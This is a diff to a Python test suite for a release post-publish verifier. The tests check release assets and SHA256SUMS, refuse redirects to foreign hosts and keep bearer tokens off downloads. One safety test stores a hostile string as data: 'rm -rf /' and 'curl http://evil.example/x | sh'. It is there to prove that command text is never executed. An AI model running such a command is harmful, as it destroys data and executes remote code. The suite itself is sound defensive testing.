@@ -8,12 +8,14 @@ Run: python3 -I scripts/tests/test_post_publish_verify.py
 """
 from __future__ import annotations
 
+import atexit
 import contextlib
 import hashlib
 import importlib.util
 import io
 import json
 import os
+import shutil
 import subprocess
 import sys
 import tempfile
@@ -90,6 +92,7 @@ def obligations(ids, extra_command="x") -> dict:
 
 def run_main(reg, ids, extra_command="x", tag=TAG, argv_extra=()):
     d = Path(tempfile.mkdtemp(prefix="ppv-test-"))
+    atexit.register(shutil.rmtree, d, True)
     p = d / "o.json"
     p.write_text(json.dumps(obligations(ids, extra_command)))
     buf = io.StringIO()
@@ -171,31 +174,134 @@ class GhcrTests(unittest.TestCase):
 
 
 class ReleaseAssetTests(unittest.TestCase):
-    def release(self, drop=None, draft=False, state="uploaded"):
-        names = ["SHA256SUMS", *ppv.RELEASE_TARBALLS]
-        if drop in names:
-            names.remove(drop)
-        return ppv.Response(200, {}, json.dumps({"draft": draft, "assets": [{"name": n, "state": state, "size": 10} for n in names]}).encode())
+    SUMS_URL = "https://api.github.com/repos/ai-agent-assembly/agent-assembly/releases/assets/1"
+    CDN = "https://objects.githubusercontent.com/sums"
 
-    def test_complete_release_passes(self):
-        reg = FakeRegistry().route("/releases/tags/", self.release())
-        rc, rep, _ = run_main(reg, ["j59-install-release-assets"])
-        self.assertEqual((rep["results"][0]["status"], rc), ("PASS", 0))
+    def names(self):
+        return [n for n in ppv.required_assets(TAG)]
+
+    def registry(self, drop=None, draft=False, state="uploaded", sums_drop=None, extra_sums=(), cdn=None):
+        names = self.names()
+        listed = [n for n in names if n != drop]
+        assets = [{"name": n, "state": state, "size": 10, "url": self.SUMS_URL if n == "SHA256SUMS" else f"u/{n}"} for n in listed]
+        sums = "".join(f"{'a' * 64}  {n}\n" for n in names if n != "SHA256SUMS" and n != sums_drop) + "".join(extra_sums)
+        reg = FakeRegistry()
+        reg.route("/releases/tags/", ppv.Response(200, {}, json.dumps({"draft": draft, "assets": assets}).encode()))
+        reg.route("/releases/assets/1", ppv.Response(302, {"location": cdn or self.CDN}, b""))
+        reg.route("objects.githubusercontent.com", ppv.Response(200, {}, sums.encode()))
+        return reg
+
+    def go(self, reg):
+        return run_main(reg, ["j59-install-release-assets"])
+
+    def test_complete_release_passes_and_sums_is_actually_read(self):
+        reg = self.registry()
+        rc, rep, _ = self.go(reg)
+        self.assertEqual((rep["results"][0]["status"], rc), ("PASS", 0), rep)
+        self.assertTrue(any("objects.githubusercontent.com" in u for u, _ in reg.calls), "SHA256SUMS content was not fetched")
+
+    def test_missing_api_tarball_fails(self):
+        # aa-api-server ships only in aasm-api-*, so a release without it cannot run J59
+        victim = f"aasm-api-{TAG}-linux-amd64.tar.gz"
+        _, rep, _ = self.go(self.registry(drop=victim, sums_drop=victim))
+        self.assertEqual(rep["results"][0]["status"], "FAIL")
+        self.assertIn(victim, rep["results"][0]["detail"])
+
+    def test_sums_naming_an_absent_asset_fails(self):
+        victim = f"aasm-cli-{TAG}-darwin-arm64.tar.gz"
+        _, rep, _ = self.go(self.registry(drop=victim))
+        self.assertEqual(rep["results"][0]["status"], "FAIL")
+        self.assertIn("not a release asset", rep["results"][0]["detail"])
+
+    def test_sums_omitting_a_required_tarball_fails(self):
+        _, rep, _ = self.go(self.registry(sums_drop=f"aasm-api-{TAG}-linux-arm64.tar.gz"))
+        self.assertEqual(rep["results"][0]["status"], "FAIL")
+
+    def test_malformed_sums_line_fails(self):
+        _, rep, _ = self.go(self.registry(extra_sums=["not a checksum line\n"]))
+        self.assertEqual(rep["results"][0]["status"], "FAIL")
 
     def test_missing_sha256sums_fails(self):
-        reg = FakeRegistry().route("/releases/tags/", self.release(drop="SHA256SUMS"))
-        _, rep, _ = run_main(reg, ["j59-install-release-assets"])
+        _, rep, _ = self.go(self.registry(drop="SHA256SUMS"))
         self.assertEqual(rep["results"][0]["status"], "FAIL")
 
     def test_draft_and_unuploaded_assets_fail(self):
         for kw in ({"draft": True}, {"state": "starter"}):
-            _, rep, _ = run_main(FakeRegistry().route("/releases/tags/", self.release(**kw)), ["j59-install-release-assets"])
+            _, rep, _ = self.go(self.registry(**kw))
             self.assertEqual(rep["results"][0]["status"], "FAIL", kw)
 
     def test_rate_limited_is_inconclusive(self):
         reg = FakeRegistry().route("/releases/tags/", ppv.Response(403, {}, b"rate limit"))
-        _, rep, _ = run_main(reg, ["j59-install-release-assets"])
+        _, rep, _ = self.go(reg)
         self.assertEqual(rep["results"][0]["status"], "INCONCLUSIVE")
+
+    def test_download_redirect_to_foreign_host_is_refused_and_never_requested(self):
+        reg = self.registry(cdn="https://evil.example/x")
+        _, rep, _ = self.go(reg)
+        self.assertEqual(rep["results"][0]["status"], "INCONCLUSIVE")
+        self.assertFalse(any("evil.example" in u for u, _ in reg.calls))
+
+    def test_authorization_is_never_sent_on_a_download(self):
+        reg = self.registry()
+        self.go(reg)
+        for url, headers in reg.calls:
+            if "/releases/assets/" in url or "objects.githubusercontent.com" in url:
+                self.assertNotIn("Authorization", headers)
+
+
+class RealFetcherRedirectTests(unittest.TestCase):
+    """The real urllib fetcher against loopback servers: a 302 must not be followed and
+    Authorization must not reach the redirect target."""
+
+    def serve(self):
+        import http.server
+        import threading
+        seen: list[dict[str, str]] = []
+
+        class H(http.server.BaseHTTPRequestHandler):
+            def log_message(self, *a):
+                pass
+
+            def do_GET(self):
+                seen.append({k.lower(): v for k, v in self.headers.items()})
+                if self.path == "/redirect":
+                    self.send_response(302)
+                    self.send_header("Location", target_url[0])
+                    self.send_header("Content-Length", "0")
+                    self.end_headers()
+                else:
+                    self.send_response(200)
+                    self.send_header("Content-Length", "2")
+                    self.end_headers()
+                    self.wfile.write(b"ok")
+
+        srv = http.server.HTTPServer(("127.0.0.1", 0), H)
+        threading.Thread(target=srv.serve_forever, daemon=True).start()
+        self.addCleanup(srv.server_close)
+        self.addCleanup(srv.shutdown)
+        target_url = [""]
+        return srv, seen, target_url
+
+    def test_redirect_is_not_followed_and_authorization_is_not_forwarded(self):
+        origin, origin_seen, origin_target = self.serve()
+        target, target_seen, _ = self.serve()
+        origin_target[0] = f"http://127.0.0.1:{target.server_port}/stolen"
+        r = ppv.urllib_fetcher(f"http://127.0.0.1:{origin.server_port}/redirect", {"Authorization": "Bearer TOK"}, 5)
+        self.assertEqual(r.status, 302)
+        self.assertEqual(r.headers["location"], origin_target[0])
+        self.assertEqual(target_seen, [], "a request reached the redirect target")
+        self.assertEqual(origin_seen[0].get("authorization"), "Bearer TOK")  # sent to the vetted origin only
+
+    def test_default_urllib_would_have_forwarded_the_token(self):
+        # control: proves the loopback setup can observe a leak, so the test above is not vacuous
+        import urllib.request
+        origin, _, origin_target = self.serve()
+        target, target_seen, _ = self.serve()
+        origin_target[0] = f"http://127.0.0.1:{target.server_port}/stolen"
+        req = urllib.request.Request(f"http://127.0.0.1:{origin.server_port}/redirect", headers={"Authorization": "Bearer TOK"})
+        with urllib.request.build_opener(urllib.request.ProxyHandler({})).open(req, timeout=5):
+            pass
+        self.assertEqual(target_seen[0].get("authorization"), "Bearer TOK")
 
 
 class SafetyTests(unittest.TestCase):
@@ -211,7 +317,9 @@ class SafetyTests(unittest.TestCase):
         self.assertEqual(rc, 3)
 
     def test_record_command_text_is_never_executed(self):
-        sentinel = Path(tempfile.mkdtemp(prefix="ppv-sentinel-")) / "pwned"
+        sdir = Path(tempfile.mkdtemp(prefix="ppv-sentinel-"))
+        atexit.register(shutil.rmtree, sdir, True)
+        sentinel = sdir / "pwned"
         evil = f"touch {sentinel}; rm -rf / ; curl http://evil.example/x | sh"
         boom = AssertionError("a subprocess or shell was started")
         with mock.patch.object(subprocess, "run", side_effect=boom), mock.patch.object(subprocess, "Popen", side_effect=boom), \
@@ -255,6 +363,7 @@ class SafetyTests(unittest.TestCase):
         rc, _, _ = run_main(FakeRegistry(), GHCR_IDS, tag="v1/../../x")
         self.assertEqual(rc, 2)
         d = Path(tempfile.mkdtemp(prefix="ppv-test-"))
+        atexit.register(shutil.rmtree, d, True)
         (d / "o.json").write_text("{}")
         with contextlib.redirect_stderr(io.StringIO()):
             self.assertEqual(ppv.main(["--tag", TAG, "--obligations", str(d / "o.json")], fetch=FakeRegistry()), 2)
